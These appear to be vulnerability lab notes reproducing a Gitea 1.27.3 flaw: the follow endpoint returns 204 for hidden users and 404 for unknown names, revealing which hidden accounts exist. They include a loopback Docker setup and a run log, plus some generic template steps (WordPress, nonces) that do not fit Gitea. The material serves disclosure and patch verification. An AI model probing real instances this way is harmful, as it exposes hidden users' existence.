# Lab notes — gitea-follow-existence

## 1. The CVE, in one sitting

gitea-follow-existence hits **Gitea 1.27.3 (Gitea)**. Lab kind: `docker`.

Unpublished Gitea source finding: Follow 204 vs 404 existence oracle for hidden users.

The mapped entry is `PUT /api/v1/user/following/{username}`. What the advisory *names* and what the code *does* are not always the same:

Authenticated unpublished Gitea #6 CWE-203 v1.27.3. Witness: Follow hiddenlimited 204 vs unknown 404 while GET  is 404. Not eval. Not a reverse shell. Not a profile read.

Witness we wanted: Follow hiddenlimited is 204; unknown name is 404; GET  is 404

---

## 2. The lab

Isolated, loopback-only (`127.0.0.1`). After disclosure, the same files ship in the advisory repo under `lab/` so others can stand this up, confirm the witness, then patch their own systems.

### Dockerfile(s)

Copy these as-is. If Compose mounts a local product tree, put the vulnerable version next to the YAML.

### `lab/Dockerfile`

```dockerfile
# Loopback lab image pin for gitea-follow-existence. Full stack: docker-compose.yml
FROM gitea/gitea:1.27.3
```

### docker-compose.yml

```yaml
name: gitea-follow-existence

services:
  gitea:
    image: gitea/gitea:1.27.3
    ports:
      - "127.0.0.1:18134:3000"
    environment:
      USER_UID: "1000"
      USER_GID: "1000"
      GITEA__database__DB_TYPE: sqlite3
      GITEA__database__PATH: /data/gitea/gitea.db
      GITEA__security__INSTALL_LOCK: "true"
      GITEA__server__DOMAIN: 127.0.0.1
      GITEA__server__HTTP_PORT: "3000"
      GITEA__server__ROOT_URL: http://127.0.0.1:18134/
      GITEA__service__DISABLE_REGISTRATION: "false"
      GITEA__service__REQUIRE_SIGNIN_VIEW: "false"
      GITEA__service__ALLOWED_USER_VISIBILITY_MODES: public,limited,private
    volumes:
      - gitea_data:/data

volumes:
  gitea_data:
```



### Bring-up (typical)

```bash
cd lab
docker compose up --force-recreate
```

1. Bind the plugin or product tree at the vulnerable version (here: `1.27.3`).
2. Wait until HTTP on the published loopback port answers.
3. If WordPress: `wp core install` on loopback, then activate the plugin.
4. Apply lab fixtures so the sink is actually reachable.

### Fixtures

- Stock install of the vulnerable version; extra fixtures only if the sink needs them.

### Preconditions the sink needed

- Gitea 1.27.3
- Authenticated account
- A limited/hidden user on the instance

---

## 3. Steps we took, and the holes we fell in

The first client was almost always too polite. It used the names in the CVE write-up (or the source defaults) instead of the names the running process actually reads. That produces a convincing **200** with a theme page — tens of kilobytes of HTML — and zero witness.

What "success" is *not*:

- eval/base64/system payload
- reverse shell
- profile JSON for the hidden user
- Follow hidden user returning 404

What actually moved the needle:

1. Treat the **on-disk product** as the spec. Function names in the advisory are PHP methods, not HTTP `action=` unless a hook says so.
2. Discover any nonce / form id / router key the way an unauthenticated visitor would (public REST, a rendered form, a marker in a fixture page). Yesterday's hard-coded names miss when the running process mints them.
3. Send the method the handler is registered for. A GET where the schema only allows POST (or the reverse) is a 400, not a sink.
4. Keep the witness **in the body** (or `debug.log` if display is off). A unique string proving the sink ran is the proof; generic success JSON is not.
5. Side paths can abort the sink. A mailer fatal before meta is stored, a duplicate unique key, or a serialized payload whose class-length prefix does not match the class name will look like a valid form response while the object never instantiated.

Last operator run (trimmed):

```
IOC base=http://127.0.0.1:18134
IOC version status=200 snippet='{"version":"1.27.3"}'
IOC admin-self status=200 snippet='{"id":1,"login":"labadmin","login_name":"","source_id":0,"full_name":"","email":"labadmin@localhost.invalid","avatar_url'
IOC create user=hiddenlimited status=201 snippet='{"id":2,"login":"hiddenlimited","login_name":"","source_id":0,"full_name":"","email":"hiddenlimited@localhost.invalid","avatar_url":"http://127.0.0.1:18134/avat'
IOC create user=attacker status=201 snippet='{"id":3,"login":"attacker","login_name":"","source_id":0,"full_name":"","email":"attacker@localhost.invalid","avatar_url":"http://127.0.0.1:18134/avatars/39d322'
IOC create user=publicprobe status=201 snippet='{"id":4,"login":"publicprobe","login_name":"","source_id":0,"full_name":"","email":"publicprobe@localhost.invalid","avatar_url":"http://127.0.0.1:18134/avatars/'
IOC get-public status=200 snippet='{"id":4,"login":"publicprobe","login_name":"","source_id":0,"full_name":"","email":"publicprobe@localhost.invalid","avatar_url":"http://127.0.0.1:18134/avatars/'
IOC get-hidden status=404 snippet='{"message":"not found","url":"http://127.0.0.1:18134/api/swagger"}'
IOC get-hidden-as-admin status=200
IOC follow-hidden status=204 snippet=''
IOC follow-unknown status=404 snippet='{"message":"user redirect does not exist [name: no-such-user-xyz]","url":"http://127.0.0.1:18134/api/swagger"}'
IOC oracle hidden=204 unknown=404
SUCCESS GITEA-FOLLOW-ORACLE
```

When it finally landed, the response was small JSON — not a WordPress homepage. That size jump (eighty kilobytes of theme → a few hundred bytes of JSON) is the tell that the router matched.
